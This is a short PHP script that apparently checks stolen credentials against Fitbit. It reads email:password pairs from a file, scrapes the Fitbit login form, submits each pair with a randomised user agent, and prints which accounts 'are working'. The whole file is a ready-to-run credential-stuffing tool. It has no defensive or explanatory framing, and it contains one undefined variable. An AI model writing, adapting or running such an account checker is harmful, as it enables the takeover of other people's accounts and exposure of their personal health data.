<?php
/**
 * Created by PhpStorm.
 * User: aurelienschiltz
 * Date: 23/03/2016
 * Time: 01:46
 */

require "includes/Utils.php";

$accounts = file_get_contents("accounts");
$accounts = explode(PHP_EOL, $accounts);
foreach ($accounts as $account) {

    $theacc = explode(":", $account);
    $ch  = curl_init();

    if (file_exists("fitbitcookie.txt"))
        unlink('fitbitcookie.txt');
    curl_setopt($ch, CURLOPT_URL, "https://www.fitbit.com/login");
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'fitbitcookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'fitbitcookie.txt');
    curl_setopt($ch, CURLOPT_USERAGENT, random_user_agent());
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

    $page = curl_exec($ch);
    if (!preg_match('/<form method="post" name="login".*?<\/form>/is', $page, $form)) {
        die('Failed to find log in form!');
    }
    $form = $form[0];

    if (!preg_match('/action=(?:\'|")?([^\s\'">]+)/i', $form, $action)) {
        die('Failed to find login form url');
    }

    $URL2 = $action[1];

    $count = preg_match_all('/<input type="hidden"\s*name="([^"]*)"\s*value="([^"]*)"/i', $form, $hiddenFields);

    $postFields = array();

    for ($i = 0; $i < $count; ++$i) {
        $postFields[$hiddenFields[1][$i]] = $hiddenFields[2][$i];
    }

    $postFields['email'] = $theacc[0];
    $postFields['password'] = $theacc[1];
    $postFields['login'] = "Log In";
    $postFields['includeWorkflow'] = "";
    $postFields['redirect'] = "";
    $postFields['switchToNonSecureOnRedirect'] = "";
    $postFields['disableThirdPartyLogin'] = "false";
    $postFields['rememberMe'] = "true";

    $post = '';

    foreach($postFields as $key => $value) {
        $post .= $key . '=' . urlencode($value) . '&';
    }

    $post = substr($post, 0, -1);
    curl_setopt($ch, CURLOPT_URL, $URL2);
    curl_setopt($ch, CURLOPT_REFERER, $URLConnect);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $page = curl_exec($ch);
    $html = str_get_html($page);
    $isError = $html->find(".errorMessage");
    if (empty($isError))
        echo $theacc[0].' is working!<br />';
    else
        echo $theacc[0].' !!!! Error<br />';
    unset($page);
    unset($html);
    unset($ch);
    unset($post);
    unset($postFields);
}

